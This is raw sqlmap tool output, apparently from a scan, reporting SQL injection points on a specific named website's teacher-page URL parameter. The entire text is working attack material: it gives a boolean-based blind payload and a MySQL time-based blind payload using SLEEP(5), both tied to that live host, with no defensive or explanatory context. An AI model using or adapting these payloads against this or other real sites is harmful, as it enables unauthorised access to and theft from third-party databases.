sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://souke.jiajiaoban.com:80/teachers/index/tuiguang:/teacherid:ff8080812865f0a20128758fb31d2648' AND 6988=6988 AND 'gjtZ'='gjtZ    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://souke.jiajiaoban.com:80/teachers/index/tuiguang:/teacherid:ff8080812865f0a20128758fb31d2648' AND SLEEP(5) AND 'uXza'='uXza---
